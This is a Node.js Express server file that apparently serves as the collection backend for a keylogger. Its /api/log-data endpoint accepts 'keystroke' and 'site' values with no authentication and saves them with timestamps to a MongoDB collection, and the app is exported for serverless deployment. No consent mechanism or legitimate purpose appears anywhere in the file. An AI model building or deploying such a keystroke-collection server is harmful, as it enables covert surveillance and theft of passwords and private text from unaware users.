// Import required modules
const express = require('express');
const mongoose = require('mongoose');
require('dotenv').config(); // Load environment variables

// Create an instance of Express application
const app = express();

// Middleware to parse JSON bodies
app.use(express.json());

// Connect to MongoDB using the connection string from environment variables
mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// Handle MongoDB connection errors
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

// Define schema and model for logs
const logSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now },
  keystroke: String,
  site: String
});

const Log = mongoose.model('sitelogs', logSchema);

// Define route to handle logging keystrokes and sites
app.post('/api/log-data', async (req, res) => {
  const { keystroke, site } = req.body;

  try {
    // Create a new log document with both keystroke and site information
    const newLog = new Log({ keystroke, site });
    
    // Save the new log document to MongoDB
    await newLog.save();
    
    // Send success response
    res.status(200).send('Data logged successfully');
  } catch (error) {
    // Handle error and send internal server error response
    console.error('Error logging data:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Define route to handle requests to the root path ("/")
app.get('/', (req, res) => {
  res.send('<h1>Welcome to my Express.js application!</h1>');
});

// Specify the port for Express.js to listen on
const PORT = process.env.PORT || 3000; // Use the port specified in the environment variable PORT, or default to 3000
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}.`);
});

// Export Express.js app for use as a serverless function
module.exports = app;
